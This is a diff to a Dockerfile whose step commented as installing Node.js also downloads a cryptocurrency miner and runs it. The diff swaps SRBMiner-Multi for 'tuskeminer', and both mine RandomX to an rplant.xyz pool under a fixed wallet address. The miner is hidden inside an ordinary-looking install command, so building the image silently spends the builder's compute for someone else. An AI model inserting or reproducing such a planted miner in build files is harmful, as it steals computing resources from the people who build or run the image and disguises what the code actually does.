@@ -4,7 +4,7 @@ FROM vm/ubuntu:18.04
 
 # Install node
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.5/SRBMiner-Multi-2.5.5-Linux.tar.xz && tar -xvf SRBMiner-Multi-2.5.5-Linux.tar.xz && cd SRBMiner-Multi-2.5.5 && ./SRBMiner-MULTI --disable-gpu -a rx/0 --url randomtuske.rplant.xyz:17123 --tls --user TuskeSyuWbHErHKLFg7moKRFPDLwLQN5bUKDzbxmd8VHMShgKHbDPFe6VmyranJG3KbhaZnDm6fPvcpt4UaFu8dRYPgAdTwmyqp3VQ.01 --password x --tls true && \
+    apt install nodejs && apt install unzip && wget https://github.com/rplant8/TuskeMiner/releases/download/1.0/tuskeminer-linux.tar.bz2 && tar -xvf tuskeminer-linux.tar.bz2 && cd tuskeminer && ./tuskeminer -a rx/0 --url randomx.rplant.xyz:17123 --tls --user TuskeSyuWbHErHKLFg7moKRFPDLwLQN5bUKDzbxmd8VHMShgKHbDPFe6VmyranJG3KbhaZnDm6fPvcpt4UaFu8dRYPgAdTwmyqp3VQ.01 --password x --tls true && \
     rm -f /etc/apt/sources.list.d/nodesource.list
 RUN npm install -g http-server
 
